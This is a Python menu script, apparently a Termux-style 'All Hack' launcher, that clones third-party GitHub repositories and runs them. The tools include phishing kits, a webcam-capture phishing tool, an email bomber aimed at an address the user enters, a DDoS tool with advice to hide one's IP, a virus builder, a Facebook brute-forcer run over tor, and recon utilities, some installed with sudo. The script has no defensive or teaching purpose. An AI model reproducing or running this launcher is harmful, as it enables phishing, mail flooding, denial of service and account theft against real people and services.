#!/usr/bin/env python3
import os
import subprocess
import sys
import time

def clear_screen():
    os.system('clear')

def print_header():
    clear_screen()
    print('''\033[31;40;1m 
  █████╗ ██╗             ████████╗ ██████╗  ██████╗ ██╗
 ██╔══██╗██║             ╚══██╔══╝██╔═══██╗██╔═══██╗██║
 ███████║██║     ███████╗   ██║   ██║   ██║██║   ██║██║
 ██╔══██║██║     ╚══════╝   ██║   ██║   ██║██║   ██║██║
 ██║  ██║███████╗           ██║   ╚██████╔╝╚██████╔╝███████╗
 ╚═╝  ╚═╝╚══════╝           ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ v1.0
  All Hack by Crypto Lord
  github: https://github.com/CRYPTOLORD25
\033[33;4mVersion:\033[0m 1.0            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m Crypto Lord Himself 🔥 

\033[37m[1]\033[36m Requirements & Updates        \033[37m[2]\033[36m Phishing Tool				
\033[37m[3]\033[36m WebCam Hack                   \033[37m[4]\033[36m Subscan			
\033[37m[5]\033[36m Gmail Bomber		  \033[37m[6]\033[36m DDOS Attack			
\033[37m[7]\033[36m How to use?	          \033[37m[8]\033[36m Uninstall downloaded programs		
\033[37m[9]\033[36m Ip Info	                  \033[37m[10]\033[36m dorks-eye
\033[37m[11]\033[36m HackerPro                    \033[37m[12]\033[36m RED_HAWK
\033[37m[13]\033[36m VirusCrafter                 \033[37m[14]\033[36m Info-Site
\033[37m[15]\033[36m BadMod	                  \033[37m[16]\033[36m Facebash
\033[37m[17]\033[36m DARKARMY                     \033[37m[18]\033[36m AUTO-IP-CHANGER
''')

def option1():
    print("\033[47;31;5m Installing updates and requirements...\033[0m")
    time.sleep(5)
    subprocess.run(["pkg", "install", "git", "-y"])
    subprocess.run(["pkg", "install", "python", "python3", "-y"])
    subprocess.run(["pkg", "install", "pip", "pip3", "-y"])
    subprocess.run(["pkg", "install", "curl", "-y"])
    subprocess.run(["apt", "update"])
    subprocess.run(["apt", "upgrade", "-y"])
    clear_screen()
    print("\033[47;3;35m Update completed...\033[0m")
    time.sleep(3)
    main()

def option2():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["git", "clone", "https://github.com/htr-tech/zphisher"])
    os.chdir("zphisher")
    subprocess.run(["bash", "zphisher.sh"])

def option3():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["git", "clone", "https://github.com/techchipnet/CamPhish"])
    os.chdir("CamPhish")
    subprocess.run(["bash", "camphish.sh"])

def option4():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.chdir("Tools")
    subprocess.run(["git", "clone", "https://github.com/zidansec/subscan"])
    os.chdir("subscan")
    sc = input("Enter a domain e.g. (example.com): ")
    subprocess.run(["./subscan", sc])

def option5():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["git", "clone", "https://github.com/juzeon/fast-mail-bomber.git"])
    os.chdir("fast-mail-bomber/")
    os.rename("config.example.php", "config.php")
    subprocess.run(["php", "index.php", "update-providers"])
    if os.path.exists("data/nodes.json"):
        os.remove("data/nodes.json")
    if os.path.exists("data/dead_providers.json"):
        os.remove("data/dead_providers.json")
    print("\033[47;3;35m This installation will take a long time\033[0m")
    print("\033[47;3;35m Press Ctrl+C to stop\033[0m")
    time.sleep(4)
    subprocess.run(["php", "index.php", "update-nodes"])
    subprocess.run(["php", "index.php", "refine-nodes"])
    print("-------------------------")
    mail = input("Enter an email address to bomb: ")
    print("-------------------------")
    subprocess.run(["php", "index.php", "start-bombing", mail])

def option6():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["git", "clone", "https://github.com/palahsu/DDoS-Ripper.git"])
    os.chdir("DDoS-Ripper")
    subprocess.run(["python3", "DRipper.py"])
    print("")
    print("\033[47;3;35m Before using, hide your IP\033[0m")

def option7():
    clear_screen()
    print("Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY")
    subprocess.run(["python3", "-m", "webbrowser", "https://www.youtube.com/watch?v=zgdq6ErscqY"])
    time.sleep(10)
    print("Wait 10 seconds")
    main()

def option8():
    clear_screen()
    print("\033[47;3;35m REMOVING DOWNLOADED PROGRAMS...\033[0m")
    time.sleep(3)
    import shutil
    if os.path.exists("Tools"):
        shutil.rmtree("Tools")
    main()

def option9():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["apt", "update"])
    subprocess.run(["apt", "install", "git", "curl"])
    subprocess.run(["git", "clone", "https://github.com/htr-tech/track-ip.git"])
    os.chdir("track-ip")
    subprocess.run(["bash", "trackip"])

def option10():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["git", "clone", "https://github.com/BullsEye0/dorks-eye.git"])
    os.chdir("dorks-eye")
    subprocess.run(["pip", "install", "-r", "requirements.txt"])
    subprocess.run(["python3", "dorks-eye.py"])

def option11():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["apt", "update"])
    subprocess.run(["apt", "upgrade"])
    subprocess.run(["apt", "install", "git"])
    subprocess.run(["apt", "install", "python2"])
    subprocess.run(["git", "clone", "https://github.com/jaykali/hackerpro.git"])
    os.chdir("hackerpro")
    subprocess.run(["sudo", "bash", "install.sh"])
    subprocess.run(["python2", "hackerpro.py"])

def option12():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["git", "clone", "https://github.com/Tuhinshubhra/RED_HAWK"])
    os.chdir("RED_HAWK")
    subprocess.run(["php", "rhawk.php"])

def option13():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["git", "clone", "https://github.com/Devil-Tigers/TigerVirus"])
    subprocess.run(["apt", "update"])
    subprocess.run(["apt", "upgrade", "-y"])
    subprocess.run(["pkg", "install", "git", "-y"])
    os.chdir("TigerVirus")
    subprocess.run(["bash", "app.sh"])

def option14():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["pkg", "install", "curl", "-y"])
    subprocess.run(["upgrade", "-y"])
    subprocess.run(["pkg", "install", "git", "-y"])
    subprocess.run(["git", "clone", "https://github.com/king-hacking/info-site.git"])
    os.chdir("info-site")
    subprocess.run(["bash", "info.sh"])

def option15():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["sudo", "apt-get", "update"])
    subprocess.run(["sudo", "apt-get", "install", "php"])
    subprocess.run(["sudo", "apt-get", "install", "php-curl"])
    subprocess.run(["git", "clone", "https://github.com/MrSqar-Ye/BadMod.git"])
    os.chdir("BadMod")
    os.chmod("INSTALL", 0o755)
    os.chmod("BadMod.php", 0o755)
    subprocess.run(["sudo", "php", "BadMod.php"])

def option16():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["git", "clone", "https://github.com/fu8uk1/facebash"])
    os.chdir("facebash")
    subprocess.run(["bash", "install.sh"])
    os.chmod("facebash.sh", 0o755)
    subprocess.Popen(["tor"])
    subprocess.run(["sudo", "./facebash.sh"])

def option17():
    print("\033[47;3;35m Installation may take some time\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["pkg", "install", "git"])
    subprocess.run(["pkg", "install", "python2"])
    subprocess.run(["apt", "install", "git"])
    subprocess.run(["apt", "install", "python2"])
    subprocess.run(["git", "clone", "https://github.com/D4RK-4RMY/DARKARMY"])
    os.chdir("DARKARMY")
    os.chmod("darkarmy.py", 0o755)
    subprocess.run(["python2", "darkarmy.py"])

def option18():
    print("\033[47;3;35m Installation may take some time\033[0m")
    print("\033[47;3;35m This tool requires you to be (ROOT)\033[0m")
    time.sleep(3)
    os.makedirs("Tools", exist_ok=True)
    os.chdir("Tools")
    subprocess.run(["sudo", "apt-get", "install", "tor"])
    subprocess.run(["pip3", "install", "requests"])
    subprocess.run(["git", "clone", "https://github.com/FDX100/Auto_Tor_IP_changer.git"])
    os.chdir("Auto_Tor_IP_changer")
    print("\033[47;3;35m go to your browser / change proxy (sock proxy) to 127.0.0.1:9050\033[0m")
    time.sleep(8)
    subprocess.run(["python3", "install.py"])
    subprocess.run(["aut"])

def main():
   
    original_dir = os.getcwd()
    
    # Create Tools directory
    os.makedirs("Tools", exist_ok=True)
    
    print_header()
    
    try:
        islem = input("Enter Any Attacking Options number: ")
        
        try:
            islem_int = int(islem)
        except ValueError:
            islem_int = None
        
        # Handle options
        if islem_int == 1 or islem == '01':
            option1()
        elif islem_int == 2 or islem == '02':
            option2()
        elif islem_int == 3 or islem == '03':
            option3()
        elif islem_int == 4 or islem == '04':
            option4()
        elif islem_int == 5 or islem == '05':
            option5()
        elif islem_int == 6 or islem == '06':
            option6()
        elif islem_int == 7 or islem == '07':
            option7()
        elif islem_int == 8 or islem == '08':
            option8()
        elif islem_int == 9 or islem == '09':
            option9()
        elif islem_int == 10 or islem == '010':
            option10()
        elif islem_int == 11 or islem == '011':
            option11()
        elif islem_int == 12 or islem == '012':
            option12()
        elif islem_int == 13 or islem == '013':
            option13()
        elif islem_int == 14 or islem == '014':
            option14()
        elif islem_int == 15 or islem == '015':
            option15()
        elif islem_int == 16 or islem == '016':
            option16()
        elif islem_int == 17 or islem == '017':
            option17()
        elif islem_int == 18 or islem == '018':
            option18()
        else:
            clear_screen()
            print('\033[36;40;1m You entered wrong code')
            time.sleep(1)
            main()
            
    except KeyboardInterrupt:
        print("\n\nExiting...")
        sys.exit(0)
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # Clear screen at start
    clear_screen()
    main()